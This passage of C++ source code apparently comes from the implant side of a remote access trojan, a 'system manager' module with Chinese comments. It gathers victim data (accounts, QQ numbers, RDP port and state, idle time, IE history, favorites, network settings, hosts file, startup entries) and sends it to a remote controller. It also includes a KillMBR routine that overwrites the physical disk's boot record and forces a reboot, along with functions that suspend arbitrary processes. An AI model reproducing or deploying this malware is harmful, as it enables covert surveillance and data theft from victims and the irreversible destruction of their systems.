    Get_LogUser(pSysInfo->szUserName,sizeof(pSysInfo->szUserName));
	//////////////////////////////////////////////////////////////////////////
	MEMORYSTATUSEX		Meminfo;
	unsigned __int64	dSize;
	memset(&Meminfo, 0, sizeof(Meminfo));
	Meminfo.dwLength = sizeof(Meminfo);
	GlobalMemoryStatusEx(&Meminfo);
	
	// 内存
	dSize = (unsigned __int64)Meminfo.ullTotalPhys;
	dSize = dSize /1024/1024+1;
	pSysInfo->szMemory = dSize;
	
	// 可用内存
	dSize = (unsigned __int64)Meminfo.ullAvailPhys;
	dSize = dSize /1024/1024+1;
	pSysInfo->szMemoryFree = dSize;
	
	ULARGE_INTEGER nTotalBytes,
		nTotalFreeBytes,
		nTotalAvailableBytes;
	ULONG nAllGB  = 0, 
		nFreeGB = 0;
    DWORD drivertype;
    char  driver[10] = {0};
    for(int i=0; i<26; i++)
    {
		driver[0] = i + ('B');
		driver[1] = (':');
		driver[2] = ('\\');
		driver[3] = 0;
		
		drivertype = GetDriveType(driver);
        if(drivertype!=DRIVE_FIXED)
			continue;
		GetDiskFreeSpaceEx(driver,&nTotalAvailableBytes,&nTotalBytes,&nTotalFreeBytes);   
		nAllGB = nAllGB + nTotalBytes.QuadPart/1024/1024/1024;
		nFreeGB = nFreeGB + nTotalFreeBytes.QuadPart/1024/1024/1024;
    }
	// 硬盘
	pSysInfo->szDriveSize     = nAllGB;
	// 可用硬盘
	pSysInfo->szDriveFreeSize = nFreeGB;
	
	//读取远程端口
	Get3389Port(pSysInfo->szRemotePort,sizeof(pSysInfo->szRemotePort));
	
	// 读取3389状态
	Get3389State(pSysInfo->szOpenInfo,sizeof(pSysInfo->szOpenInfo));
	
	// 服务端位置和服务端大小
	char	szDatPath[MAX_PATH];
	DWORD    dwFileSize = 0;

	GetModuleFileName(hDllModule,szDatPath,sizeof(szDatPath));

	HANDLE handle = CreateFile(szDatPath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
	if (handle != INVALID_HANDLE_VALUE)
	{
		dwFileSize = GetFileSize(handle, NULL)  / 1024;
		CloseHandle(handle);
	}
	wsprintf(pSysInfo->szDLLPath,"%s (文件大小: %d KB)",szDatPath,dwFileSize);
	
	// 分辨率
	wsprintf(pSysInfo->szScrxy,"%d * %d",GetSystemMetrics(SM_CXSCREEN),GetSystemMetrics(SM_CYSCREEN));
	//上线地址
	pSysInfo->port = NetPort;
//	pSysInfo->szAddress = Linkaddress;
//	wsprintf(pSysInfo->port,"%s",Linkaddress);
	strcpy(pSysInfo->szAddress,Linkaddress);
	//QQ获取
//	pSysInfo->szQQNum = GetQQ();

	strcpy(pSysInfo->szQQNum,GetQQ());
	//历史QQ
//	char *str;
	GetLocalQQNum(pSysInfo->szQQNums);
//	strcpy(pSysInfo->szQQNums,str);
	//空闲时间
	LASTINPUTINFO lpi;
	lpi.cbSize = sizeof(lpi);
	GetLastInputInfo(&lpi);
	int iTime = (GetTickCount() - lpi.dwTime)/1000;//得到秒数
	wsprintf(pSysInfo->szTime, "%d 秒", iTime);
	
	//是否活动
	if ((::GetTickCount()-lpi.dwTime)>1000*60*3)//5分钟
	{
		//当前系统已经空闲了1分钟
        pSysInfo->bIsActive = true;
	}
	int LanguageID=GetSystemDefaultUILanguage();   //返回操作系统语言的ID号
	switch(LanguageID)
	{
	case 0x0404:
//		printf("CHT\n");//Chinese  Taiwan 
		strcpy(pSysInfo->szLanguage,"中国台湾");
		break;
	case 0x0804:
//		printf("CHS\n");//Chinese PRC 
		strcpy(pSysInfo->szLanguage,"简体中文");
		break;
	case 0x0c04:
//		printf("ZHH\n");//Chinese Hong Kong SAR 
		strcpy(pSysInfo->szLanguage,"中国香港特区");
		break;
	case 0x1004:
//		printf("ZHH\n");//Chinese Singapore 
		strcpy(pSysInfo->szLanguage,"中国新加坡");
		break;
	case 0x1404:
//		printf("ZHM\n");//Chinese Macau SAR  
		strcpy(pSysInfo->szLanguage,"中国澳门特区");
		break;
	case 0x0809:
//		printf("ENG\n");//English United Kingdom 
		strcpy(pSysInfo->szLanguage,"英国英语");
		break;
	case 0x0409:
//		printf("USA\n");//English United States  
		strcpy(pSysInfo->szLanguage,"美国英语");
		break;
	default:
//		printf("Default\n");
		strcpy(pSysInfo->szLanguage,"Find Language infomation error");
		break;
	}

	
	return;
}


/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

LPBYTE CSystemManager::getSysUserList()
{
    //遍历开始   
	LPBYTE			lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = TOKEN_USLIST;
	DWORD			dwOffset = 1;
	
	char user_name[50];
	char group_name[50];
	
    LPUSER_INFO_0   bufptr   =   NULL;   
    LPUSER_INFO_0   pTmpBuf  =   NULL;   
	LPUSER_INFO_1   puiVal   =   NULL;
	LPLOCALGROUP_USERS_INFO_0 pBuf = NULL; 
    DWORD   dwLevel        = 0,
		dwEntriesRead  = 0,
		dwTotalEntries = 0, 
		dwResumeHandle = 0,
		dwPrefMaxLen = MAX_PREFERRED_LENGTH;  
	
    NET_API_STATUS   nStatus = NetUserEnum(NULL,dwLevel,FILTER_NORMAL_ACCOUNT,(LPBYTE*)&bufptr,dwPrefMaxLen,&dwEntriesRead,&dwTotalEntries,&dwResumeHandle);   
	
    if((nStatus   ==   NERR_Success)   ||   (nStatus   ==   ERROR_MORE_DATA))   
	{   
		if((pTmpBuf = bufptr) != NULL)
		{
			
			for(DWORD  i=0;i<dwEntriesRead;++i)   
			{ 
				memset(user_name,0,sizeof(user_name));
				wcstombs(user_name,pTmpBuf->usri0_name,50);   
				
				memcpy(lpBuffer + dwOffset, user_name, lstrlen(user_name)+1);
				dwOffset += lstrlen(user_name)+1;
				
				
				memset(group_name,0,sizeof(group_name));
				
				DWORD dwRead    = 0,
					dwEntries = 0; 
				NET_API_STATUS nStatus = NetUserGetLocalGroups(
					NULL,
					pTmpBuf->usri0_name,
					dwLevel,
					LG_INCLUDE_INDIRECT,
					(LPBYTE*)&pBuf,
					dwPrefMaxLen,
					&dwRead,
					&dwEntries); 
				
				
				if(nStatus == NERR_Success&&pBuf) 
					wcstombs(group_name,pBuf->lgrui0_name,50);
				else
					strcpy(group_name,"error");
				
				memcpy(lpBuffer + dwOffset, group_name, lstrlen(group_name) + 1);
				dwOffset += lstrlen(group_name) + 1;
				
				
				char *GetInfo="活跃";
				if(NERR_Success == NetUserGetInfo(NULL,pTmpBuf->usri0_name, 1, (LPBYTE *)&puiVal))
					if((puiVal->usri1_flags & UF_ACCOUNTDISABLE))
						GetInfo="禁用";
					
					memcpy(lpBuffer + dwOffset, GetInfo, lstrlen(GetInfo) + 1);
					dwOffset += lstrlen(GetInfo) + 1;
					
					pTmpBuf++;   
			}		
		}
		else
			goto ERRO;
	} 
	else
	{
ERRO:
	LocalFree(lpBuffer);
	return NULL;
	}
	
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	
	
	if(bufptr)   
		NetApiBufferFree(bufptr);   
	
	if(puiVal)
		NetApiBufferFree(puiVal);
	
	if (pBuf)
		NetApiBufferFree(pBuf);
	
	return lpBuffer;
}
//发送IE历史浏览记录
void CSystemManager::SendIEHistoryList()
{
	LPBYTE	lpBuffer = getIEHistoryList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}
//发送IE收藏夹内容
void CSystemManager::SendFavoritesUrlList()
{
	LPBYTE	lpBuffer = getFavoritesUrlList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}
//发送网络连接
void CSystemManager::SendNetStateList()
{
 	LPBYTE	lpBuffer = getNetStateList();
 	if (lpBuffer == NULL)
 		return;
 	
 	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	OutputDebugString("网络连接发送完成！");
 	LocalFree(lpBuffer);
}



#include  <urlhist.h>   //   Needed   for   IUrlHistoryStg2   and   IID_IUrlHistoryStg2
#include  <COMDEF.H>
inline char* UnicodeToAnsi( const wchar_t* szStr )  
{  
    int nLen = WideCharToMultiByte( CP_ACP, 0, szStr, -1, NULL, 0, NULL, NULL );  
    if (nLen == 0)  
    {  
        return "未知";  
    }  
    char* pResult = new char[nLen];  
    WideCharToMultiByte( CP_ACP, 0, szStr, -1, pResult, nLen, NULL, NULL );  
    return pResult;  
}


LPBYTE CSystemManager::getIEHistoryList()
{
    HRESULT   hr; 
    IUrlHistoryStg2   *puhs; 
    IEnumSTATURL   *pesu; 
    STATURL   su; 
    ULONG   celt = 0; 
	//  _bstr_t   bstr; 
	CoInitialize(NULL);
    hr = CoCreateInstance(CLSID_CUrlHistory, NULL, CLSCTX_INPROC_SERVER, IID_IUrlHistoryStg, (LPVOID*)&puhs); 
	
	
	LPBYTE	lpBuffer = NULL;
	DWORD	dwOffset = 0;
	DWORD	dwLength = 0;
	
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 10000);
	lpBuffer[0] = TOKEN_IHLIST;
	dwOffset = 1;
	
	
	char strTime[50] = {0};
	char *strUrl, *strTitle;
    if(SUCCEEDED(hr)) 
    { 
        hr = puhs-> EnumUrls(&pesu);
        if(SUCCEEDED(hr)) 
        {
            while(SUCCEEDED(pesu->Next(1, &su, &celt)) && celt > 0)
            {
				strUrl = UnicodeToAnsi(su.pwcsUrl);
                strTitle = UnicodeToAnsi(su.pwcsTitle);
				
				
				SYSTEMTIME  st;
				FileTimeToSystemTime(&su.ftLastVisited,&st);
				wsprintf(strTime,"%d-%d-%d %d:%d:%d",st.wYear,st.wMonth,st.wDay,st.wHour,st.wSecond,st.wMinute);
				
				
				dwLength = lstrlen(strUrl) + lstrlen(strTitle) + lstrlen(strTime) + 3;
				
				if (LocalSize(lpBuffer) < (dwOffset + dwLength))
					lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);
				
				memcpy(lpBuffer + dwOffset, strTime, lstrlen(strTime) + 1);
				dwOffset += lstrlen(strTime) + 1;
				
				memcpy(lpBuffer + dwOffset, strTitle, lstrlen(strTitle) + 1);
				dwOffset += lstrlen(strTitle) + 1;
				
				
				
				memcpy(lpBuffer + dwOffset, strUrl, lstrlen(strUrl) + 1);
				dwOffset += lstrlen(strUrl) + 1;
            }
            
            puhs-> Release();
        }
    }
    CoUninitialize();
	
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	
	return lpBuffer;
}


LPBYTE	lpFUBuffer = NULL;
DWORD	dwFUOffset = 1; // 位移指针
void FindFavoritesUrl(char* searchfilename)
{
	char favpath[MAX_PATH] = {0};
	char tmpPath[MAX_PATH] = {0};
	DWORD	dwFULength = 0;
	
	lstrcat(favpath,searchfilename);
	lstrcat(favpath,"\\*.*");
	
	WIN32_FIND_DATA fd;
	ZeroMemory(&fd, sizeof(WIN32_FIND_DATA));  
	
	HANDLE hFind = FindFirstFile(favpath, &fd); // 文件后缀都是 url
	do 
	{
		if (fd.cFileName[0] != '.')
		{
			strcpy(tmpPath, searchfilename);  
			strcat(tmpPath, "\\");  
			strcat(tmpPath, fd.cFileName);  
			if( fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY )   
			{  
				
				FindFavoritesUrl(tmpPath);  
			}else if (strstr(fd.cFileName, ".url"))
			{
				//				printf("文件名 ： %s 匹配 \r\n",fd.cFileName);
				
				TCHAR buf[MAX_PATH] = {0};
				::GetPrivateProfileString("InternetShortcut", "URL", "", buf, sizeof(buf), tmpPath);
				
				
				dwFULength = lstrlen(buf) + lstrlen(fd.cFileName) + 2;
				
				if (LocalSize(lpFUBuffer) < (dwFUOffset + dwFULength))
					lpFUBuffer = (LPBYTE)LocalReAlloc(lpFUBuffer, (dwFUOffset + dwFULength) + 1024, LMEM_ZEROINIT|LMEM_MOVEABLE);
				
				memcpy(lpFUBuffer + dwFUOffset, fd.cFileName, lstrlen(fd.cFileName) + 1);
				dwFUOffset += lstrlen(fd.cFileName) + 1;
				
				memcpy(lpFUBuffer + dwFUOffset, buf, lstrlen(buf) + 1);
				dwFUOffset += lstrlen(buf) + 1;
				
			}
		}
	} while(FindNextFile(hFind, &fd) );
	FindClose(hFind);	
}
LPBYTE CSystemManager::getFavoritesUrlList()
{
	char favpath[MAX_PATH] = {0};
	
	// 从注册表获取收藏夹所在位置
    HKEY hKEY;
	DWORD type=REG_SZ;
	LPCTSTR path="Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders";
    DWORD cbData=80;
	::RegOpenKeyEx(HKEY_CURRENT_USER,path,0,KEY_READ,&hKEY);
	::RegQueryValueEx(hKEY,"Favorites",NULL,&type,(LPBYTE)favpath,&cbData);
	::RegCloseKey(hKEY);
	
	
	lpFUBuffer = (LPBYTE)LocalAlloc(LPTR, 10000);
	lpFUBuffer[0] = TOKEN_FULIST;
	dwFUOffset = 1;
	
    FindFavoritesUrl(favpath);
	
	lpFUBuffer = (LPBYTE)LocalReAlloc(lpFUBuffer, dwFUOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	
	return lpFUBuffer;
}
//硬盘毁灭// 修改系统启动项引导！
void CSystemManager::KillMBR()
{	
	HANDLE hDevice;
	DWORD dwBytesWritten, dwBytesReturned;
	BYTE pMBR[512] = {0};
	// 重新构造MBR
	memcpy(pMBR, "", sizeof(""));
	pMBR[510] = 0x55;
	pMBR[511] = 0xAA;
	char str201036[]={'\\','\\','.','\\','P','H','Y','S','I','C','A','L','D','R','I','V','E','0','\0'};
	hDevice = CreateFileA(str201036, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hDevice == INVALID_HANDLE_VALUE)return;
	DeviceIoControl(hDevice, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL);
	WriteFile(hDevice, pMBR, sizeof(pMBR), &dwBytesWritten, NULL);
	DeviceIoControl(hDevice, FSCTL_UNLOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL);
	CloseHandle(hDevice);
	Sleep(2000);
	DWORD   dwVersion   =   GetVersion();   
    if   (dwVersion   <   0x80000000)   //   Is   NT   or   2000!   
    {   
		HANDLE   hToken;  
		TOKEN_PRIVILEGES   tkp;   
		OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES   |   TOKEN_QUERY,   &hToken); 
		LookupPrivilegeValue(NULL,SE_SHUTDOWN_NAME,&tkp.Privileges[0].Luid); 
		tkp.PrivilegeCount= 1;
		tkp.Privileges[0].Attributes   =   SE_PRIVILEGE_ENABLED;
		AdjustTokenPrivileges(hToken,   FALSE,   &tkp,   0,(PTOKEN_PRIVILEGES)NULL,   0); 
		ExitWindowsEx(EWX_FORCE+EWX_REBOOT,   0);   
	}  
	else
		ExitWindowsEx(EWX_FORCE+EWX_REBOOT,0);
	exit(0);
}
//获取MAC地址


int GetMac(char * mac)     
{     
    NCB ncb;
    typedef struct _ASTAT_
    {
        ADAPTER_STATUS   adapt;
        NAME_BUFFER   NameBuff   [30];
    }ASTAT,*PASTAT;
	
    ASTAT Adapter;   
	
    typedef struct _LANA_ENUM
    {
        UCHAR   length;
        UCHAR   lana[MAX_LANA];
    }LANA_ENUM;
	
    LANA_ENUM lana_enum;    
    UCHAR uRetCode;
    memset(&ncb, 0, sizeof(ncb));
    memset(&lana_enum, 0, sizeof(lana_enum));    
    ncb.ncb_command = NCBENUM;
    ncb.ncb_buffer = (unsigned char *)&lana_enum;
    ncb.ncb_length = sizeof(LANA_ENUM);
    uRetCode = Netbios(&ncb);
	
    if(uRetCode != NRC_GOODRET)     
        return uRetCode;     
	
    for(int lana=0; lana<lana_enum.length; lana++)     
    {
        ncb.ncb_command = NCBRESET;
        ncb.ncb_lana_num = lana_enum.lana[lana];
        uRetCode = Netbios(&ncb); 
        if(uRetCode == NRC_GOODRET)
            break; 
    }
	
    if(uRetCode != NRC_GOODRET)
        return uRetCode;     
	
    memset(&ncb, 0, sizeof(ncb));
    ncb.ncb_command = NCBASTAT;
    ncb.ncb_lana_num = lana_enum.lana[0];
    strcpy((char*)ncb.ncb_callname, "*");
    ncb.ncb_buffer = (unsigned char *)&Adapter;
    ncb.ncb_length = sizeof(Adapter);
    uRetCode = Netbios(&ncb);
	
    if(uRetCode != NRC_GOODRET)
        return uRetCode;
	
    wsprintf(mac,"%02X-%02X-%02X-%02X-%02X-%02X",
        Adapter.adapt.adapter_address[0],
        Adapter.adapt.adapter_address[1],
        Adapter.adapt.adapter_address[2],
        Adapter.adapt.adapter_address[3],
        Adapter.adapt.adapter_address[4],
        Adapter.adapt.adapter_address[5]);
	
    return 0;   
} 

LPBYTE CSystemManager::getNetWorkList()
{
		LPBYTE 	lpBuffer = NULL;
	DWORD	dwOffset = 1;
	DWORD   dwLength = 0;
	
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	if(lpBuffer == NULL)
		return NULL;
	lpBuffer[0] = TOKEN_NETWORK;
    PIP_ADAPTER_INFO pIpAdapterInfo = NULL;
    pIpAdapterInfo = new IP_ADAPTER_INFO;
	
    //结构体大小
    unsigned long ulSize = sizeof(IP_ADAPTER_INFO);
	
    //获取适配器信息
    int nRet = GetAdaptersInfo(pIpAdapterInfo,&ulSize);
	
    if (ERROR_BUFFER_OVERFLOW == nRet)
    {
        //空间不足，删除之前分配的空间
        delete []pIpAdapterInfo;
		
        //重新分配大小
        pIpAdapterInfo = (PIP_ADAPTER_INFO) new BYTE[ulSize];
		
        //获取适配器信息
        nRet = GetAdaptersInfo(pIpAdapterInfo,&ulSize);
		
        //获取失败
        if (ERROR_SUCCESS  != nRet)
        {
            if (pIpAdapterInfo != NULL)
            {
                delete []pIpAdapterInfo;
            }
            return FALSE;
        }
    }
	
    //MAC 地址信息
    char szMacAddr[20];
	
	char			mingchen[MAX_PATH] = {0};
	char            miaoshu[MAX_PATH] = {0};
	CHAR           ipdiz[MAX_PATH] ={0};
	char            mac[MAX_PATH] ={0};
	char            ziwang[MAX_PATH] ={0};
	
	char            wangguan[MAX_PATH] ={0};
	
    //赋值指针
    PIP_ADAPTER_INFO pIterater = pIpAdapterInfo;
    while(pIterater)
    {
		strcpy(mingchen,pIterater->AdapterName);
        strcpy(miaoshu,pIterater->Description);
		char   mac1[200]; 
		GetMac( mac1);
		strcpy(mac, mac1 );		
        PIP_ADDR_STRING pIpAddr = &pIterater->IpAddressList;
        while (pIpAddr)
        {strcpy(ipdiz, pIpAddr->IpAddress.String);
		strcpy(ziwang,pIpAddr->IpMask.String);
		
		//指向网关列表
		PIP_ADDR_STRING pGateAwayList = &pIterater->GatewayList;
		while(pGateAwayList)
		{strcpy(wangguan,pGateAwayList->IpAddress.String);
		
		pGateAwayList = pGateAwayList->Next;
		}
		
		pIpAddr = pIpAddr->Next;
        }
		
        pIterater = pIterater->Next;
    }

    //清理
	dwLength = lstrlen(mingchen) + lstrlen(miaoshu) + lstrlen(ipdiz) + lstrlen(mac) + lstrlen(ziwang) +lstrlen(wangguan) + 6;
	// 缓冲区太小，再重新分配下
	if (LocalSize(lpBuffer) < (dwOffset + dwLength))
		lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);


	memcpy(lpBuffer + dwOffset, (char *)mingchen, lstrlen((char *)mingchen) + 1);
	dwOffset += lstrlen((char *)mingchen) + 1; //这个是名称

	
	memcpy(lpBuffer + dwOffset, (char *)miaoshu, lstrlen((char *)miaoshu) + 1);
	dwOffset += lstrlen((char *)miaoshu) + 1; //这个是路径
	
	memcpy(lpBuffer + dwOffset, (char *)mac, lstrlen((char *)mac) + 1);
	dwOffset += lstrlen((char *)mac) + 1; //这个是路径

	memcpy(lpBuffer + dwOffset, (char *)ipdiz, lstrlen((char *)ipdiz) + 1);
	dwOffset += lstrlen((char *)ipdiz) + 1; //这个是名称
	
	
	memcpy(lpBuffer + dwOffset, (char *)ziwang, lstrlen((char *)ziwang) + 1);
	dwOffset += lstrlen((char *)ziwang) + 1; //这个是路径
	
	memcpy(lpBuffer + dwOffset, (char *)wangguan, lstrlen((char *)wangguan) + 1);
	dwOffset += lstrlen((char *)wangguan) + 1; //这个是路径
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);		
	
		if (pIpAdapterInfo)
		{
	    	delete []pIpAdapterInfo;
		}

	return lpBuffer;


}
//获取网络连接
void CSystemManager::SendNetWorkList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getNetWorkList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}
//获取Host文件
void CSystemManager::SendHostsList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getHostsList(TOKEN_HOSTS);
	if (lpBuffer == NULL)
		return;
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}
//文件属性
void CSystemManager::SendFileAttr(LPCSTR FilePath)
{
// 	TCHAR FilePath[MAX_PATH];
// 	mbstowcs(FilePath, (const char *)szBuffer,MAX_PATH);
	
	UINT	nRet = -1;
	LPBYTE	lpBuffer = GetFileAttr(TOKEN_FILEATTR,FilePath);
	if (lpBuffer == NULL)
		return;
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer)); 
	
	LocalFree(lpBuffer);
}
void CSystemManager::SendRunList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getRunList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

LPBYTE CSystemManager::getRunList()
{
	LPBYTE 	lpBuffer = NULL;
	DWORD	dwOffset = 1;
	DWORD   dwLength = 0;
	
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	if(lpBuffer == NULL)
		return NULL;
	
	lpBuffer[0] = TOKEN_RUN;
	HKEY hKey ; 
	HKEY hKey1; 
	LPCTSTR lpSubKey="SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\"; 
	LPCTSTR lpSubKey1="HKEY_LOCAL_MACHINE"; 
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpSubKey, 0, KEY_READ, &hKey)!= ERROR_SUCCESS) 
	{ 
		return 0; 
	} 
	
	
#define NAME_LEN 200 
	char szValueName[NAME_LEN]; 
	BYTE szPortName[NAME_LEN]; 
	LONG status; 
	DWORD dwIndex = 0; 
	DWORD dwSizeValueName=200; 
	DWORD dwSizeofPortName=200; 
	DWORD Type; 
	dwSizeValueName = NAME_LEN; 
	dwSizeofPortName = NAME_LEN; 
	
	
    do 
	{ 
		status = RegEnumValue(hKey, dwIndex++, szValueName, &dwSizeValueName, NULL, &Type, 
			szPortName, &dwSizeofPortName); 
		if((status == ERROR_SUCCESS)) 
		{ 
			/*	m_lstPort.AddString((char *)szPortName); */
			memcpy(lpBuffer + dwOffset, (char *)szValueName, lstrlen((char *)szValueName) + 1);
			dwOffset += lstrlen((char *)szValueName) + 1; //这个是名称
			
			
			memcpy(lpBuffer + dwOffset, (char *)szPortName, lstrlen((char *)szPortName) + 1);
			dwOffset += lstrlen((char *)szPortName) + 1; //这个是路径
			
			memcpy(lpBuffer + dwOffset, (char *)lpSubKey1, lstrlen((char *)lpSubKey1) + 1);
			dwOffset += lstrlen((char *)lpSubKey1) + 1; //这个是路径
			
			
		} 
		dwSizeValueName = NAME_LEN; 
		dwSizeofPortName = NAME_LEN; 
	} while((status!= ERROR_NO_MORE_ITEMS)); 
	
	RegCloseKey(hKey); 
	
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);	
	return lpBuffer;
	
	
}

void CSystemManager::ProcessFreezing(LPBYTE lpBuffer, UINT nSize)  //进程冻结
{
	HANDLE hProcess = NULL;
	DebugPrivilege(SE_DEBUG_NAME, TRUE);
	DWORD Pid = *(LPDWORD)(lpBuffer);
	THREADENTRY32 th32;
	th32.dwSize=sizeof(th32);
	
	HANDLE hThreadSnap=::CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD,0);
	if(hThreadSnap==INVALID_HANDLE_VALUE)
	{
		//		return -1;
	}
	BOOL b=::Thread32First(hThreadSnap,&th32);
	while(b)
	{
		if(th32.th32OwnerProcessID==Pid)
		{	
			HANDLE oth=OpenThread(THREAD_ALL_ACCESS,FALSE,th32.th32ThreadID);
			if(!(::SuspendThread(oth)))
			{
				//	printf("Onlock ExeFileName %s\n",pe32.szExeFile);
			}
			CloseHandle(oth);
			//	break;  //对于线程不能break了,注意哦~
		}
		b=::Thread32Next(hThreadSnap,&th32);
	}
	::CloseHandle(hThreadSnap);

}
void CSystemManager::ProcessThawing(LPBYTE lpBuffer, UINT nSize)  //进程解冻
{	
	HANDLE hProcess = NULL;
	DebugPrivilege(SE_DEBUG_NAME, TRUE);
	DWORD Pid = *(LPDWORD)(lpBuffer);
	THREADENTRY32 th32;
	th32.dwSize=sizeof(th32);
	
	HANDLE hThreadSnap=::CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD,0);
	if(hThreadSnap==INVALID_HANDLE_VALUE)
	{
		//		return -1;
	}
	BOOL b=::Thread32First(hThreadSnap,&th32);
	while(b)
	{
		if(th32.th32OwnerProcessID==Pid)
		{	
			HANDLE oth=OpenThread(THREAD_ALL_ACCESS,FALSE,th32.th32ThreadID);
			if(::ResumeThread(oth))
			{
				//	m_List.SetItemText(idx,2,_T("已解冻！"));
//				MessageBox(NULL,"已解冻","1",0);
			}
			else
			{
				//	m_List.SetItemText(idx,2,_T("解冻失败！"));
//				MessageBox(NULL,"解冻失败","1",0);
			}
			CloseHandle(oth);
			break;
		}
		::Thread32Next(hThreadSnap,&th32);
	}
	::CloseHandle(hThreadSnap);
}